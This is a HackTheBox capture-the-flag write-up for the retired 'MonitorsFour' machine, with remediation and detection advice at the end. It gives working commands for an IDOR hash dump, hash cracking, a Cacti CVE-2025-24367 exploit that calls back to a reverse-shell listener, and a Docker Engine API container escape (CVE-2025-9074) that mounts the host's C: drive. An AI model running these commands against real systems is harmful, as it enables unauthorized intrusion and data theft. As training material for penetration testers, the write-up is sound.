# MonitorsFour

| | |
|---|---|
| **Platform** | HTB (Season 9) |
| **OS** | Windows (Docker Desktop / WSL2) |
| **Difficulty** | Easy |
| **Status** | Retired ✅ |
| **Tags** | `web` `idor` `hash-cracking` `vhost` `cve` `cacti` `docker-escape` |

> An IDOR on a PHP API leaks every user's MD5 hash, one cracked password unlocks an internal Cacti instance (CVE-2025-24367 → RCE), and the "Linux shell on a Windows box" turns out to be a Docker Desktop container that can talk to an unauthenticated Docker Engine API (CVE-2025-9074) — mount `C:\` and read root.

---

## Attack chain

```mermaid
flowchart LR
  A[nmap: 80 nginx, 5985 WinRM] --> B[IDOR /user?token=0]
  B --> C[MD5 hashes -> hashcat]
  C --> D[vhost: cacti.monitorsfour.htb]
  D --> E[Cacti 1.2.28 login]
  E --> F[CVE-2025-24367 RCE]
  F --> G[shell in Linux container -> user]
  G --> H[Docker Engine API 192.168.65.7:2375]
  H --> I[CVE-2025-9074: new container, bind C:\]
  I --> J[root.txt]
```



---

## Recon

```bash
sudo nmap -sS -p- --min-rate=5000 -oA scans/allports $RHOST
sudo nmap -sCV -p80,5985 -oA scans/services $RHOST
echo "$RHOST monitorsfour.htb" | sudo tee -a /etc/hosts
```

- `80/tcp` — nginx, redirects to `monitorsfour.htb` → **virtual hosting** ("виртуальный хостинг"), add to `/etc/hosts`.
- `5985/tcp` — WinRM (`Microsoft-HTTPAPI/2.0`), so the host really is Windows.

## Enumeration

```bash
ffuf -t 100 -ac \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
  -u http://monitorsfour.htb/FUZZ
```

Directory fuzzing finds a `/user` endpoint that returns account data based on a `token` parameter.

## Foothold

### 1. IDOR → hash dump

**IDOR / BOLA** ("небезопасная прямая ссылка на объект"): the server trusts a client-supplied identifier and never checks that it belongs to the caller. Here the lookup is by `token`, and `token=0` matches every record:

```bash
curl -s 'http://monitorsfour.htb/user?token=0' | jq .
```

The response contains every user with an **unsalted MD5** password hash.

### 2. Offline cracking

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

One hash cracks to `wonderful1`.

### 3. Hidden vhost → Cacti

```bash
ffuf -ac -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://monitorsfour.htb -H 'Host: FUZZ.monitorsfour.htb'
```

Finds `cacti.monitorsfour.htb` → **Cacti 1.2.28**. Usernames built from the leaked records plus the cracked password give a valid Cacti session (password reuse).

### 4. CVE-2025-24367 — authenticated RCE

Cacti's graph-template handling lets an authenticated user inject options into the `rrdtool` command line and write an attacker-controlled PHP file into the web root. The public PoC does it in two stages (write the stager, then fetch the reverse shell), so **both** an HTTP server with the payload and a listener must be running:

```bash
python3 -m http.server 80          # serves the stage-2 payload
nc -lvnp 4444                      # catches the shell
python3 exploit.py -u <user> -p wonderful1 -url http://cacti.monitorsfour.htb -i $LHOST -l 4444
```

**Result:** shell as `www-data` — inside a **Linux** container on a Windows host → **user** flag.

## Privilege escalation — out of the container

The key insight: Windows + Linux shell = **Docker Desktop**, which runs Linux containers inside a WSL2 VM. Docker Desktop below 4.44.3 exposes the **Docker Engine API without authentication** on its internal network (**CVE-2025-9074**). No `nmap`/`nc` in the container, so probe with bash:

```bash
for h in $(seq 1 254); do
  (echo > /dev/tcp/192.168.65.$h/2375) 2>/dev/null && echo "192.168.65.$h:2375 open"
done
curl -s http://192.168.65.7:2375/version
```

Whoever can talk to the Engine API controls Docker — including starting a new container with the **host's** `C:\` bind-mounted (Docker Desktop exposes host drives under `/mnt/host/c`):

```bash
API=http://192.168.65.7:2375
curl -s -X POST -H 'Content-Type: application/json' $API/containers/create?name=pwn \
  -d '{"Image":"<existing-image>","Cmd":["cat","/host/Users/Administrator/Desktop/root.txt"],
       "HostConfig":{"Binds":["/mnt/host/c:/host"]}}'
curl -s -X POST $API/containers/pwn/start
curl -s "$API/containers/pwn/logs?stdout=1"
```

**Result:** `root.txt` read from the Windows host.

---

## Why it works

Three trust failures stack: the API trusts a client-supplied `token`, users reuse passwords across apps, and Docker Desktop trusts anything on its internal network to drive the Engine API. A container is only an isolation boundary if the thing that *creates* containers is not reachable from inside one.

## Remediation

- Authorize object access server-side; never return records by an unvalidated/zero token. Store passwords with a slow salted hash (bcrypt/argon2), not MD5.
- Patch Cacti (> 1.2.28) and keep it off public vhosts or behind SSO.
- Update Docker Desktop to ≥ 4.44.3; never expose the Engine API without TLS client auth.
- **Detection:** alert on `rrdtool` spawning shells, new PHP files in the Cacti web root, and container creation with host-drive bind mounts.

## References

- CVE-2025-24367 — Cacti graph template RCE
- CVE-2025-9074 — Docker Desktop unauthenticated Engine API
- OWASP API Security Top 10 — API1: Broken Object Level Authorization
